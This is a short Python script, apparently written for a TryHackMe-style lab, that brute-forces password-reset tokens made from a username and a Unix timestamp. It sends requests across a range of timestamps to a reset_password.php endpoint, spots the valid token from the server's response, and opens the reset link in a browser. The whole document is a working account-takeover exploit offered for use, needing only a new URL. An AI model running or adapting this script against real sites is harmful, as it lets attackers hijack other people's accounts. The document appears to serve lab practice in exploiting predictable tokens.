import requests
import sys
import webbrowser

# Function to brute force the reset token
def brute_force_token(username, start_timestamp, span):
    url = "http://random.thm:8090/case/reset_password.php"
    
    # Try tokens within a range of -5 minutes
    for i in range(span, 0):
        current_timestamp = start_timestamp + i
        token = f"{username}{current_timestamp}"
        params = {'token': token}
        
        response = requests.get(url, params=params)
        
        # Check if the token is valid
        if "Invalid or expired token." not in response.text:
            print(f"Correct token identified: {token}")
            return token
        else:
            print(f"Tried token: {token} (Invalid)")
    
    print("No valid token found in the given range.")
    return None

def useToken(username, secret):
    urlTwo =  "http://random.thm:8090/case/reset_password.php?token="
    webbrowser.open(urlTwo+secret)
    


if len(sys.argv) != 4 :
    print("Usage: python exploit.py <username> <unix_timestamp> <span>")
    sys.exit(1)



username = sys.argv[1]
start_timestamp = int(sys.argv[2])
span = int(sys.argv[3])
if span > -1:
    print("You must choose a time frame using a negative numerical value")

print("username: ", username, "\n", " timestamp: ", start_timestamp, "\n", " span: ", span)

secret = brute_force_token(username, start_timestamp, span)
if secret:
    useToken(username, secret)
else:
    sys.exit(1)